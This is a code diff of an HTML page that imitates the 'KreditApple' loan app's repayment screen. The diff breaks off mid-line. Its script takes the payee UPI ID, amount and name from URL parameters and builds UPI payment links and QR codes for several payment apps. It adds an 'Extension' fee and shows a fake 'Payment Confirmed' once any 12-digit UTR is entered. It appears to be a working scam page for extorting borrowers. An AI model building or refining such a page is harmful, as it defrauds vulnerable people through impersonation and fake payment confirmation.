@@ -11,9 +11,7 @@ body{margin:0;background:#f6f6f6}
 .topbar h2{margin:0;font-size:22px;flex:1;text-align:center}
 .topbar span{font-size:22px;cursor:pointer}
 .wrap{max-width:430px;margin:0 auto;background:#fff;min-height:100vh;padding-bottom:30px}
-/* STEP 1 - KreditApple */
-.pending{background:#ff5a1f;color:#fff;margin:15px;border-radius:10px 10px 0 0;padding:15px 18px;display:flex;justify-content:space-between;align-items:center;font-size:16px;font-weight:bold}
-.pending b{font-size:32px}
+.pending{background:#ff5a1f;color:#fff;margin:15px;border-radius:10px 10px 0 0;padding:15px 18px;font-size:16px;font-weight:bold}
 .amountBox{display:flex;border:1px solid #eee;margin:0 15px;border-radius:0 0 10px 10px;overflow:hidden}
 .amountBox div{flex:1;text-align:center;padding:18px 5px}
 .amountBox div:first-child{border-right:1px solid #eee}
@@ -32,7 +30,6 @@ body{margin:0;background:#f6f6f6}
 .warn b{position:absolute;top:-12px;left:12px;background:#ff3b30;color:#fff;width:24px;height:24px;border-radius:50%;text-align:center;line-height:24px;font-size:16px}
 .unlock{text-align:center;font-size:13px;padding:20px 0;color:#333}
 .auto{text-align:center;color:#e86a2a;padding:10px;font-size:16px}
-/* STEP 2 - Payment */
 .card{max-width:420px;margin:0 auto;background:#fff;border-radius:16px;overflow:hidden;box-shadow:0 5px 20px rgba(0,0,0,.1)}
 .ptop{background:#0b3d91;color:#fff;padding:20px;text-align:center}
 .ptop h2{margin:0;font-size:22px}
@@ -55,18 +52,19 @@ button{cursor:pointer}
 .success{display:none;text-align:center;padding:20px}
 .back{padding:10px 15px;color:#0b3d91;cursor:pointer;font-size:14px}
 .channelBadge{background:#fff3e0;color:#e86a2a;padding:6px 12px;border-radius:20px;font-size:13px;font-weight:bold;display:inline-block;margin-bottom:10px}
+.typeBadge{background:#e8f5e9;color:#1b7a2e;padding:6px 12px;border-radius:20px;font-size:13px;font-weight:bold;display:inline-block;margin-bottom:10px;margin-left:5px}
 </style>
 </head>
 <body>
 <div class="wrap">
 
-<!-- ===== STEP 1 : KREDITAPPLE ===== -->
+<!-- STEP 1 -->
 <div id="step1">
 <div class="topbar"><span>&lt;</span><h2>KreditApple</h2><span>☰</span></div>
-<div class="pending"><span>Pending Repayment</span><span><b id="daysLeft">2</b> &nbsp;Days left</span></div>
+<div class="pending"><span>Pending Repayment</span></div>
 <div class="amountBox">
-<div><small>A Tenure Extension/₹</small><h2 id="extAmt">1,600</h2></div>
 <div><small>Repayment Amount / ₹</small><h2 id="repayAmt">4,000</h2></div>
+<div><small>A Tenure Extension/₹</small><h2 id="extAmt">1,600</h2></div>
 </div>
 <div class="channel">
 <h3>Repayment Channel</h3>
@@ -77,22 +75,22 @@ button{cursor:pointer}
 <button class="chBtn" onclick="selectCh(5,this)">Channel 5</button>
 </div>
 <div class="btnRow">
-<button class="repayBtn" onclick="goPay()">Repay</button>
-<button class="extBtn" onclick="alert('Extension ke liye 1600 pay karo')">Extension</button>
+<button class="repayBtn" onclick="goPay('repay')">Repay</button>
+<button class="extBtn" onclick="goPay('extension')">Extension</button>
 </div>
-<div class="voucher" onclick="document.getElementById('step1').style.display='none';document.getElementById('step2').style.display='block'">Repayment Voucher Entry &gt;</div>
+<div class="voucher" onclick="goPay('repay')">Repayment Voucher Entry &gt;</div>
 <div class="warn"><b>!</b>Repay on time to improve your credit score. Don't pay to the personal UPI.</div>
 <div class="unlock">Unlocked For Repeat Loans ₹5000.00</div>
 <div class="auto">Auto-Schedule Next Loan &gt;</div>
 </div>
 
-<!-- ===== STEP 2 : PAYMENT ===== -->
+<!-- STEP 2 -->
 <div id="step2" style="display:none">
 <div class="back" onclick="backToHome()">&lt; Back</div>
 <div class="card">
 <div class="ptop"><h2 id="displayName">BharatPe Payment</h2><p>Scan QR ya UPI ID se Pay Karo</p></div>
 <div class="pbody" id="payBox">
-<center><span class="channelBadge" id="chBadge">Channel 1 Selected</span></center>
+<center><span class="channelBadge" id="chBadge">Channel 1 Selected</span><span class="typeBadge" id="typeBadge">Repay - ₹4,000</span></center>
 <div class="qr"><img id="qrImg" src="" alt="QR Code Loading..."></div>
 <button class="paynow" onclick="payNow()">Pay Now - Direct Pay Karo</button>
 <div class="appRow">
@@ -125,53 +123,24 @@ button{cursor:pointer}
 <script>
 const params = new URLSearchParams(window.location.search);
 let vpa = params.get('vpaInput') || "BHARATPE.90065511470@fbpe";
-let amt = params.get('amntInput') || "4000";
+let baseAmt = params.get('amntInput') || "4000";
 let nm = params.get('nameInput') || "kreditapple";
 let selectedCh = 1;
-vpa = vpa.trim(); amt = amt.trim(); nm = nm.trim();
-document.getElementById('repayAmt').innerText = Number(amt).toLocaleString('en-IN');
-document.getElementById('extAmt').innerText = Math.round(Number(amt)*0.4).toLocaleString('en-IN');
+let currentType = 'repay';
+let currentAmt = baseAmt;
+vpa = vpa.trim(); baseAmt = baseAmt.trim(); nm = nm.trim();
+let extAmtCalc = Math.round(Number(baseAmt)*0.4);
+document.getElementById('repayAmt').innerText = Number(baseAmt).toLocaleString('en-IN');
+document.getElementById('extAmt').innerText = extAmtCalc.toLocaleString('en-IN');
 function selectCh(n,el){
   selectedCh=n;
   document.querySelectorAll('.chBtn').forEach(b=>b.classList.remove('active'));
   el.classList.add('active');
 }
-function goPay(){
+function goPay(type){
+  currentType = type;
+  if(type=='extension'){ currentAmt = String(extAmtCalc); } else { currentAmt = String(baseAmt); }
   document.getElementById('step1').style.display='none';
   document.getElementById('step2').style.display='block';
-  document.getElementById('chBadge').innerText = "Channel "+selectedCh+" Selected";
-  document.getElementById('vpaText').innerText = vpa;
-  let upiLink = "upi://pay?pa="+vpa+"&pn="+(nm||"BharatPe")+"&am="+amt+"&cu=INR";
-  window.upiLink = upiLink;
-  let qr = document.getElementById('qrImg');
-  qr.src = "https://quickchart.io/qr?text=" + encodeURIComponent(upiLink) + "&size=220";
-  qr.onerror = function(){ this.onerror=null; this.src = "https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=" + encodeURIComponent(upiLink); };
-  document.getElementById('displayName').innerText = nm + " - Payment";
-  document.getElementById('name').value = nm;
-  document.getElementById('amount').value = amt;
-  window.scrollTo(0,0);
-}
-function backToHome(){ document.getElementById('step2').style.display='none'; document.getElementById('step1').style.display='block'; }
-function copyUPI(){ navigator.clipboard.writeText(vpa); alert("UPI Copy Ho Gaya!"); }
-function payNow(){ window.location.href = window.upiLink; }
-function payApp(app){
-  let link = window.upiLink;
-  if(app=='gpay') link = "tez://upi/pay?pa="+vpa+"&pn="+(nm||"BharatPe")+"&am="+amt+"&cu=INR";
-  if(app=='phonepe') link = "phonepe://pay?pa="+vpa+"&pn="+(nm||"BharatPe")+"&am="+amt+"&cu=INR";
-  if(app=='paytm') link = "paytmmp://pay?pa="+vpa+"&pn="+(nm||"BharatPe")+"&am="+amt+"&cu=INR";
-  window.location.href = link;
-  setTimeout(function(){ window.location.href = window.upiLink; }, 1200);
-}
-function submitPay(){
-  let n=document.getElementById('name').value.trim();
-  let a=document.getElementById('amount').value.trim();
-  let u=document.getElementById('utr').value.trim();
-  if(!n || !a || !u){ alert("Please Naam, Amount aur UTR bharo"); return; }
-  if(u.length !== 12 || isNaN(u)){ alert("Please 12 Digit ka sahi UTR dalo"); return; }
-  document.getElementById('payBox').style.display='none';
-  document.getElementById('successBox').style.display='block';
-  document.getElementById('successText').innerHTML = "Channel: <b>Channel "+selectedCh+"</b><br>Naam: <b>"+n+"</b><br>Amount: <b>"+a+"</b><br>UTR: <b>"+u+"</b><br><br>Status: <b style='color:green;font-size:18px'>Payment Confirmed</b>";
-}
-</script>
-</body>
-</html>
+  document.getElementById('payBox').style.display='block';
+  document.getElementById('successBox').style.display
